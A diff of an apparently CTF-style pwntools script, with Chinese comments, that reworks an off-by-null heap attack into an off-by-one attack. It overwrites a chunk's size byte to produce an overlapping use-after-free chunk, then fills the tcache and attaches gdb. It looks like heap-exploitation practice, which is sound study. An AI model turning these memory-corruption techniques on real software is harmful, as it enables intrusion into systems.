@@ -101,33 +101,33 @@ def test_malloc_free():
     show_chunk()
     free_chunk("1")
 '''
-那么如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。
+那么如果可以控制chunk的size字段的一个低字节，那么可以产生一个UAF的chunk块
 '''
 @show_message
-def off_by_null_attack():
+def off_by_one_attack():
     print(hex(io.libc.address+0x1b8000)) #会修改目标地址会堆上的地址的值
     targetaddr = p64(io.libc.address+0x1b8000-0x20)
     io.sendline("1")
     #0x38 0x28 0xf8
-    malloc_chunk("1","0x38")  # chunk size 0x430
-    malloc_chunk("2","0x28")  # chunk size 0x4a0
-    malloc_chunk("3","0xf8") # chunk size 0x4b0
+    malloc_chunk("1","0x38")  # chunk size 
+    malloc_chunk("2","0x20")  # chunk size
+    malloc_chunk("3","0x20")
+    edit_chunk("1","0x39","b"*0x38+'a')  # chunk size
+
+    free_chunk("2")
+    malloc_chunk("4","0x50")
+    # 对于chunk 3 来说，会产生UAF
+    free_chunk("3")
+    
+    gdb.attach(io)
     #
     for i in range(0,7):
         malloc_chunk(str(i+4),"0xf8")
     for i in range(0,7):
         free_chunk(str(i+4))
-    #malloc_chunk("2","512")  # chunk size 0x420
-    #malloc_chunk("8","512")
-    #free_chunk("1")
-    #gdb.attach(io)
-    #malloc_chunk("3","0x448")
-    #edit_chunk("1","0x38","A"*0x38+b"\0".decode('utf-8'))
-    #free_chunk("2") # put the chunk 2 into unsorted bin
-    #gdb.attach(io)
-    #malloc_chunk("4","0x498") # write the targetaddr value
-    gdb.attach(io,"b *$rebase(0x000001722)")
+
+    #gdb.attach(io,"b *$rebase(0x000001722)")
 io = start()
-off_by_null_attack()
+off_by_one_attack()
 io.interactive()
 
